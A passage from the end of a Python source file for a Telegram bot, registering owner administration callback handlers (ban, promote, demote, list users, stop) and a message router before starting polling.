    bot_app.add_handler(CallbackQueryHandler(owner_concurrent_callback, pattern="^owner_concurrent$"))
    bot_app.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
    bot_app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
    bot_app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
    bot_app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
    bot_app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
    bot_app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
    bot_app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
    bot_app.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
    bot_app.add_handler(CallbackQueryHandler(owner_stop_callback, pattern="^owner_stop$"))
    bot_app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
    
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
    
    # Start bot
    print("✅ Bot started! Press Ctrl+C to stop.")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()